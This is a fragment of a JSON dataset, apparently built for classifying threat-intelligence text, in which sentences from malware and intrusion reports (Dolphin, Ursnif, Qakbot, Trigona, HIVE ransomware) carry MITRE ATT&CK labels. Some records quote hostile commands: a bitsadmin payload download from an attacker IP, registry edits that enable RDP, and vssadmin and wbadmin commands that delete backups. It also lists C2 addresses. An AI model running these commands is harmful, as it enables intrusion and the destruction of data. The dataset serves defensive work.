    "type": "text",
    "text": "Oh oh, something wrong with defender Something wrong for the Defender LSASS dump in the WebDAV detected, but file not deleted If you even want to improve this workflow, there is a great tool called PowerHub offering a BlackHole WebDAV, meaning the server will immediately move the file out of the WebDAV. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "To start the loading chain after installation, it creates a one-time scheduled task. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Step 2, shellcode, creates a host process (random CLI executable from %WINDIR%\\System32\\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Step 3, another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We named the backdoor Dolphin based on a PDB path found in the executable: D:\\Development\\BACKDOOR\\Dolphin\\x64\\Release\\Dolphin.pdb Persistence The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\<random_run_name>\\”%appdata%\\Python27({32|64})\\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>” Capabilities The following basic information about the computer and the backdoor is collected: Current backdoor configuration Username Computer name Local and external IP address List of installed security products RAM size and usage Result of check for debugger and other inspection tools (such as Wireshark) OS version Current time Malware version Dolphin downloads commands, issued by its operators, from Google Drive storage and executes them.",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1082",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "File exfiltration By default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This search can be extended to fixed drives (HDDs), via dedicated commands. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The command to get specific files was improved, by caching/storing it in the configuration until completion. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It creates directory listings and exfiltrates files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This is done via the GetAsyncKeyState API, with keystrokes being logged along with the window name and current time.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode is stored in the registry, under one of the following keys: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Classic\\<random_number> HKCU\\Software\\Microsoft\\OneDrive\\Update\\<random_number> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\HttpsSoftware\\Microsoft\\Internet Explorer\\Zone\\<random_number> (two subkeys as one, likely a coding error) ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It can be executed either locally or in a specified separate process that is created and injected. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In the newer versions, the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphin’s startup, which was not the case in version 1.9 (the original version we analyzed). ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Shell commands Dolphin can execute shell commands; this is done via the popen API and their output is retrieved. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "First, it enables access to Gmail via the IMAP protocol by sending an HTTP POST request to: https://mail.google.com/mail/u/0/?ik=<GM_ID_KEY>&at=<GM_ACTION_TOKEN>&view=up&act=prefs ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Data staging Dolphin exfiltrates data to Google Drive storage, staging the data in encrypted ZIP archives before upload.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APIDolphin uses Windows API functions to execute files and inject processes. ",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PersistenceT1053.005Scheduled Task/Job: Scheduled TaskDolphin uses a temporary scheduled task to start after installation. T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderDolphin uses Run keys for persistence of its loader. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "T1083File and Directory DiscoveryDolphin can obtain file and directory listings. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "T1016System Network Configuration DiscoveryDolphin obtains the device’s local and external IP address. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "T1033System Owner/User DiscoveryDolphin obtains the victim’s username. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "T1005Data from Local SystemDolphin can collect files from local drives. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "T1074.001Data Staged: Local Data StagingDolphin stages collected data in a directory before exfiltration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Command and ControlT1071.001Application Layer Protocol: Web ProtocolsDolphin uses HTTPS to communicate with Google Drive. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Depending on the number of command line parameters, different actions are performed: Zero or two parameters: “Installs” the malware in the system, and calls Stage 1 again via process hollowing with four parameters One parameter: Same as previous action but without the “installation” Four parameters: Creates a memory section with the DES-encrypted malware configuration and a second Shikata Ga Nai shellcode decompressing and loading Stage 2.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It then runs Stage 2 via process hollowing. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Depending on the privileges of the process, the malware either creates a registry key or a service that launches the moved executable rc.exe with one parameter.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Malware features Looking at the features, several of the functions found in the latest update are similar to the previous SysUpdate version: Service manager (lists, starts, stops, and deletes services) Screenshot grab Process manager (browses and terminates processes) Drive information retrieval File manager (finds, deletes, renames, uploads, downloads a file, and browses a directory) ",
    "command": "",
    "labels": [
      "T1057",
      "T1059.003",
      "T1070.004",
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Command execution Iron Tiger also added a feature that had not been seen before in this malware family:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "C&C communication with DNS TXT records First, the malware retrieves the configured DNS servers by calling the GetNetworkParams API function and parsing the DnsServerList linked list.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "= regular C&C 0x01 C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Size of next section 4 Next section contains all the hardcoded names (folder, files, registry values) 0x00000034 Name of the hardcoded directory where files are copied Variable The folder is located either in % gtdcfp Name of the executable vulnerable to side loading Variable TextInputHost.exe Name of the malicious side-loaded DLL Variable rc.dll Name of the binary file containing the encoded Stage 1 Variable rc.bin Name of the service or registry key value used for persistence Variable gtdcfp We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "It appears that a chat application was used as a lure to entice the victim into opening the malicious file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution): File Name Purpose 6570872.lnk LNK file that executes alsoOne.bat me/by Empty folder me/here Empty folder me/123.com Renamed legitimate version of rundll32.exe me/alsoOne.bat Batch script to run canWell.js with specific arguments me/canWell.js Reverses argument strings and executes tslt.db with 123.com me/itslt.db Ursnif DLL or.jpg Image not used. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Execution Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif Malware Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat .",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Exec(): me/123.com me/itsIt.db,DllRegisterServer Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "; Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike An instance of cmd.exe was launched through explorer.exe which ran the following command: powershell.exe -nop -c \"start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\'",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It is possible this explorer.exe ➝ cmd.exe session was through a VNC session. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Persistence Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Credential Access We observed a process created by Cobalt Strike accessing lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "\"reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s >>",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\BD2C.bin1\" Manual discovery Once the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands: whoami whoami /groups time ipconfig /all systeminfo The threat actor quickly took interest in a support account.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "net user <REDACTED> ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\\Windows\\system32\\cmd.exe /C adcomp.bat which contained the PowerShell command: powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1057",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\taskmgr.exe /4 Lateral Movement WMI was used to pivot to a domain controller on the network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets: The use of Impacket by threat actors has been recently detailed by the US CERT in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization. ",
    "command": "",
    "labels": [
      "T1005",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here: https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf One of the observed commands invoked via WMI was ‘firefox.exe’. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon. Command and Control Ursnif Ursnif was seen using the following domains and IPs: 5.42.199.83superliner.top 62.173.149.7 internetlines.in 31.41.44.97 superstarts.top 31.41.44.27 superlinez.top 31.41.44.27 internetlined.com 208.91.197.91 denterdrigx.com: 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 We also observed several modules for Ursnif downloaded from the following IP: ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Exfiltration Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The example HTTP stream containing the content The file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\\Users\\<REDACTED>\\AppData\\Local\\Temp’ ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this example, the mix of activity can be observed as: Impact The threat actor was able to RDP to a backup server using the admin credentials they acquired.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Logon Process: NtLmSsp Authentication Package: NTLM Transited Services: - Package Name (NTLM only): NTLM V2 During that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The Zip contains an ISO image file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The victim double clicks the ISO to mount it (1).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The shortcut file (2) executes a CMD file (3) when clicked. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The CMD file contains commands which use certutil (renamed here as slaughterhouse.exe) to decode Qakbot’s DLL (brainstorms.sql).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The decoded DLL is then executed using rundll32 and injects Qakbot into wermgr.exe. ",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Victims can be lured into clicking executable content including binaries, scripts or shortcut files masquerading as benign filetypes such as PDFs or folders.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The use of ISO images has seen some iterative improvements throughout the last year by threats such as Qakbot.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The ransomware then appends the ._locked file extension, modifies registry keys to maintain persistence, and drops ransom notes. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Creates two registry keys for persistence, one for the ransomware binary and another for the ransom note. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "“path” Encrypts only files contained within specified path /!local Does not encrypt local system files, only encrypts files on local network /!lan Does not encrypt local network files, only encrypts files on local system /autorun_only “path” Creates registry key for persistence only.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Allows for optional “path” to be provided to override default path, does not encrypt files The ransomware establishes persistence through the creation of two keys in CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Keys found in CurrentVersion\\Run contain references to programs that will execute when a user logs in. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Start.bat Start.bat is a batch script that performs the following activities: It creates a new folder at C:\\temp It copies other malicious batch and EXE files from a compromised internal Server Message Block (SMB) server to the newly created temp folder It executes Turnoff.bat Turnoff.bat Turnoff.bat is a cleanup script used to remove evidence of the attack on a system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It does so by performing the following activities: Clearing the Recycle Bin of any mounted drive Attempting to use sc stop and taskkill to stop over 100 services related to various areas ranging from remote desktop tools to Windows Defender Attempting to stop services related to VMware, Hyper-V and SQL Ending several running tasks related to the stopped services mentioned above Clear Windows Event Logs (using wevutil cl) ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Newuser.bat Newuser.bat is a batch script that creates a new user with the name fredla and the password Qw123456.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "DC2.exe DC2.exe contains a password protected version of Mimikatz, which is a tool used for extracting sensitive information such as passwords and authentication credentials from a Windows operating system. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Among its many legitimate uses, Unit 42 researchers have most often observed Mimikatz being leveraged maliciously by threat actors in the following ways: Credential Loading Mimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process and the Windows registry. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Credential Manipulation Mimikatz allows the user to manipulate the dumped credentials, such as changing passwords, creating new user accounts and adding users to groups. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "DC4.exe DC4.exe is a small, UPX-packed password protected binary that generates and executes an embedded batch file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the batch file makes the following changes to the system: Disables the User Account Control (UAC) and sets cmd.exe as a debugger for HelpPane.exe, utilman.exe, Magnify.exe and sethc.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Opens specific ports on the firewall to allow remote desktop connections using the netsh command. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Modifies the Windows registry to allow remote desktop connections. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Accessibility Features DC4.exe creates a batch script that, when executed, creates a “Sticky Keys backdoor” that allows for creation of a command prompt with NT AUTHORITY\\SYSTEM privileges. T1136.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Modify Registry DC4.exe creates a batch script that, when executed, modifies the Windows Registry to allow remote desktop connections. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Disable or Modify System Firewall Trigona operators open up an Remote Desktop Protocol (RDP) port in the firewall with DC4.exe. T1070.001.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Indicator Removal: File Deletion Trigona operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Credentials from Password Stores Trigona operators use Mimikatz to dump passwords. T1003.001.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "OS Credential Duping: LSASS Memory Trigona operators use Mimikatz to dump passwords from LSASS. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol Trigona operators utilize RDP to move laterally in the victim’s environment. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The emails contain weaponized versions of seemingly genuine official documents, which employ the remote template injection method to retrieve the next stage of the malware from the TA’s Command-and-Control (C&C) server.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Figure 3 – Opened document attachment from spam email Upon opening the document, it initiates the download of a new payload from the attacker’s remote server (hxxp[:]//13[.]236[.]189[.]80:8000/res/translate[.]res), which is RTF file serving as the next-level payload. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It achieves this by creating a scheduled task entry, which executes the export function “StartA” from the DLL “c6gt.b” using rundll32.exe on a daily basis. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1106",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5 – Embedded payload in RTF file Once the persistence is established, the RTF file proceeds to execute the downloaded DLL payload by utilizing the “rundll32.exe” command as follows: ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Figure 6 – Export functions of the DLL loader When the loader is executed through rundll32.exe, it collects various data from the victim’s computer.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "This includes the hostname, operating system name, OS version, username, Internet information, as well as the presence of any installed anti-virus software on the machine. ",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specifically designed to download a backdoor module.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, it downloads and executes a malicious backdoor. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "With its extensive capabilities, this backdoor possesses the ability to perform a variety of operations, including: Capture screenshots of victims’ system Obtain information about processes and services running on the machine Create or terminate processes Delete/Create/Rename/Read/Write files and retrieve file attributes Retrieve TCP/UDP tables Retrieve information about registry keys Obtain titles of all top-level windows Trigger a shutdown of the targeted computer Gather computer-specific information such as computer name, username, gateway address, network adapter details, Windows version, and user type Conclusion The SharpPanda APT group is comprised of exceptionally sophisticated cyber-TAs who execute targeted and extended attacks against specific targets, including governments, organizations, and industries, with the objectives of spying, disruption, or monetary gain.",
    "command": "",
    "labels": [
      "T1012",
      "T1016",
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "What approach did the malicious actor take to prepare the victim's environment?Initially using Cobalt Strike, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (BITSAdmin).\"C:\\Windows\\system32\\bitsadmin.exe\" /transfer",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "/priority normal http://79.137.206.47/int.exe C:\\Windows\\int.exe The malicious actor then began using the remote process execution tool PSExec to execute batch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions (RDP) using reg.exe.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This enabled the malicious actor to laterally move throughout the victim’s environment using the graphical user interface.PSEXESVC.exe: C:\\Windows\\PSEXESVC.exe└──cmd.exe: C:\\Windows\\system32\\cmd.exe /c \"\"rdp.bat\" \"└── reg.exe: reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "\"fDenyTSConnections\" /t",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "REG_DWORD /d 0",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "/f Rapid7 observed the malicious actor add/change policies for the Active Directory domain to perform the following:Copy down batch scriptsExecute batch scripts (file1.bat), which:Creates administrator account on the local systemReconfigures boot configuration data (bcdedit.exe) so that the host will not load any additional drivers or services (ie: network drivers or endpoint protection)Sets various registry values to ensure the created local administrator user will automatically logon by defaultChanges the Windows Shell from Explorer to their malicious script (file2.bat)Reboots the system with the shutdown commandOn reboot, the system logs in and executes the shell (file2.bat), which:Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7-Zip's console executable (7zr.exe)Executes the ransomware payload (int.exe or int64.exe)Below are some commands observed executed by the malicious actor (with necessary redactions):xcopy.exe /C/Q/H/Y/Z \"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies {<REDACTED>}\\Machine\\Scripts\\Startup\\file1.bat\" \"C:\\windows\" xcopy.exe /C/Q/H/Y/Z \"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\{<REDACTED>}\\Machine\\Scripts\\Startup\\file2.bat\" \"C:\\windows\" xcopy.exe /C/Q/H/Y/Z \"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\{<REDACTED>}\\Machine\\Scripts\\Startup\\7zr.exe\" \"C:\\windows\" xcopy.exe /C/Q/H/Y/Z \"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\{<REDACTED>}\\Machine\\Scripts\\Startup\\int.7z\" \"C:\\windows\\\" C:\\WINDOWS\\SYSTEM32\\cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Manually priming the host in this way is more effective than the existing capabilities of the HIVE ransomware which stops specific defensive services (Windows Defender, etc) and kills specific processes prior to encrypting the contents of the drive.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Fundamentally, the sample’s respective flags distill down into encryption operations of local, mount and discovery. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The local module utilizes the LookupPrivilegeValueW and AdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and OpenProcessToken to obtain SeDebugPrivilege privileges. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This is presumably crucial for OpenProcess -> OpenProcessToken -> ImpersonateLoggedOnUser API call attempts to processes: winlogon.exe and trustedinstaller.exe to subsequently stop security services and essential processes, if the --low-key is not passed during execution. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe, notepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and ransom note display purposes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Command line flags may be used to change this behavior and invoke one or more of the modules.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Will also skip enumeration and stopping of antivirus software.-no-local--no-localDo not encrypt local files-no-mounted--no-mountedDo not encrypted mounted filesystems-no-discovery--no-discoveryDo not enumerate or encrypt file shares on the network-local-only--local-onlyOnly encrypt local file systems-network-only--network-onlyOnly encrypt file shares on the network.-explicit-only--explicit-onlyOnly encrypt files in this specific path specified-min-size--min-sizeOnly encrypt files greater than or equal to a specific number of bytes-t-timer--timerDo not encrypt files until after specified number of secondsBy default, the ransomware will execute the following child processes with the following arguments:Use of vssadmin.exe in order to delete shadow copies of files which deletes unencrypted backups of files they are attempting to ransom:\"C:\\Windows\\System32\\vssadmin.exe\" delete shadows /all /quietUse of wmic.exe to create calls that also delete all shadow copies of files which deletes unencrypted backups of files they are attempting to ransom:\"C:\\Windows\\System32\\wbem\\WMIC.exe\" shadowcopy deleteUse of wbadmin.exe to delete backup catalogs:\"C:\\Windows\\System32\\wbadmin.exe\" delete systemstatebackup\"C:\\Windows\\System32\\wbadmin.exe\" delete catalog-quiet\"C:\\Windows\\System32\\wbadmin.exe\" delete systemstatebackup -keepVersions:3Use of bcdedit.exe to disable automatic repair and ignore errors when booting:\"C:\\Windows\\System32\\bcdedit.exe\" /set",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
